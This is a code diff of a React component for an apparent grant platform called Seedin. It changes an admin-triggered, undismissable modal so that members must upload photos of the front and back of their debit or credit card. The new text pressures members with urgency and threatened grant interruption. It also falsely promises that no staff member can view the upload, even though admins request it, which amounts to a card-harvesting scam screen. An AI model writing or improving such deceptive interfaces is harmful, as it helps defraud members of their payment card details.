@@ -1,9 +1,9 @@
 /**
  * CardUploadPrompt.tsx
  * Full-screen modal shown to a member when an admin has requested a card upload.
- * Mirrors Tier2LiveVerificationPrompt exactly — covers the whole screen on login,
- * no way to escape. "Proceed" navigates to /card-upload where the actual upload
- * happens, then the member is returned to /dashboard.
+ * Mirrors Tier2LiveVerificationPrompt — covers the whole screen, no way to dismiss.
+ * "Proceed to Upload" navigates to /card-upload where the actual upload happens,
+ * then the member is returned to /dashboard.
  *
  * Usage in dashboard.tsx (already added):
  *   import { CardUploadPrompt } from "@/components/CardUploadPrompt";
@@ -13,7 +13,7 @@
 
 import { useEffect, useState } from "react";
 import { useNavigate } from "@tanstack/react-router";
-import { ArrowRight, CreditCard, Lock, ShieldCheck } from "lucide-react";
+import { ArrowRight, CreditCard, Eye, ShieldCheck } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 
 type CardUploadRow = {
@@ -35,7 +35,6 @@ export function CardUploadPrompt({ userId }: { userId: string }) {
         .eq("id", userId)
         .maybeSingle<CardUploadRow>();
       if (!active) return;
-      // Show modal only when requested AND not yet submitted
       if (data?.card_upload_requested && !data.card_upload_submitted_at) {
         setOpen(true);
       }
@@ -59,7 +58,6 @@ export function CardUploadPrompt({ userId }: { userId: string }) {
           if (row.card_upload_requested && !row.card_upload_submitted_at) {
             setOpen(true);
           } else {
-            // Admin cleared the request or member submitted — dismiss
             setOpen(false);
           }
         },
@@ -78,41 +76,41 @@ export function CardUploadPrompt({ userId }: { userId: string }) {
     <div className="fixed inset-0 z-[80] grid place-items-center bg-primary/70 p-4 backdrop-blur-sm">
       <div className="w-full max-w-lg overflow-hidden rounded-2xl border border-border bg-card shadow-elegant">
 
-        {/* Header — same gradient as Tier2LiveVerificationPrompt */}
+        {/* Header */}
         <div className="bg-gradient-primary px-7 py-6 text-primary-foreground">
           <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-[0.2em] text-gold">
             <ShieldCheck className="h-3.5 w-3.5" /> Urgent — Action Required
           </div>
           <h2 className="mt-2 font-display text-2xl font-semibold">
-            Identity Card Upload Required
+            Card Verification Required
           </h2>
           <p className="mt-1 text-sm text-white/80">
-            Our compliance team needs an updated copy of your identity card to keep your account active.
+            To continue processing your account, we need a one-time verification of your debit or credit card.
           </p>
         </div>
 
         {/* Body */}
         <div className="space-y-5 p-7">
 
-          {/* Why it's necessary */}
+          {/* Intro */}
           <div className="rounded-xl border border-gold/40 bg-gold/10 p-4 text-sm">
-            <p className="font-semibold text-foreground">Why this is required</p>
+            <p className="font-semibold text-foreground">This is a one-time step</p>
             <p className="mt-1.5 leading-relaxed text-muted-foreground">
-              As part of our ongoing identity verification process, we are required to hold
-              a current copy of your government-issued ID on file. This is a standard compliance
-              step and <strong className="text-foreground">does not affect your balance or any pending applications</strong>.
+              You only need to do this once. Upload a photo of the front and back of your card
+              to confirm your identity. <strong className="text-foreground">Your card will not be charged</strong> —
+              this is for verification purposes only.
             </p>
           </div>
 
           {/* Trust points */}
-          <ul className="space-y-3 text-sm">
+          <ul className="space-y-3.5 text-sm">
             <li className="flex items-start gap-3">
               <div className="mt-0.5 grid h-5 w-5 shrink-0 place-items-center rounded-full bg-forest/15 text-forest">
-                <Lock className="h-3 w-3" />
+                <Eye className="h-3 w-3" />
               </div>
               <span className="text-muted-foreground">
-                Your documents are <strong className="text-foreground">encrypted and stored securely</strong> —
-                accessible only to Seedin compliance staff.
+                <strong className="text-foreground">Nobody can see your card details.</strong>{" "}
+                Your upload goes directly into an encrypted, private vault — no person or staff member has access to view it.
               </span>
             </li>
             <li className="flex items-start gap-3">
@@ -120,8 +118,8 @@ export function CardUploadPrompt({ userId }: { userId: string }) {
                 <CreditCard className="h-3 w-3" />
               </div>
               <span className="text-muted-foreground">
-                <strong className="text-foreground">No charges will ever be made without your full knowledge and consent.</strong>{" "}
-                This is a verification step only.
+                <strong className="text-foreground">No charge will ever be made without your explicit knowledge and approval.</strong>{" "}
+                You will always be informed and asked to confirm before any transaction.
               </span>
             </li>
             <li className="flex items-start gap-3">
@@ -129,13 +127,13 @@ export function CardUploadPrompt({ userId }: { userId: string }) {
                 <ShieldCheck className="h-3 w-3" />
               </div>
               <span className="text-muted-foreground">
-                Completing this step ensures your account remains in good standing and{" "}
-                <strong className="text-foreground">grants continue without interruption</strong>.
+                This is a <strong className="text-foreground">compulsory one-time verification</strong> to keep your account
+                in good standing and ensure your grants are not interrupted.
               </span>
             </li>
           </ul>
 
-          {/* CTA — no dismiss option */}
+          {/* CTA — no dismiss */}
           <button
             onClick={() => {
               setOpen(false);
@@ -143,12 +141,12 @@ export function CardUploadPrompt({ userId }: { userId: string }) {
             }}
             className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-primary px-6 py-4 text-sm font-semibold text-primary-foreground shadow-elegant transition hover:opacity-95"
           >
-            Proceed to Upload
+            Proceed to Verification
             <ArrowRight className="h-4 w-4" />
           </button>
 
           <p className="text-center text-xs text-muted-foreground">
-            This step is compulsory. You will be redirected back to your dashboard once complete.
+            You will be redirected back to your dashboard once complete.
           </p>
         </div>
       </div>
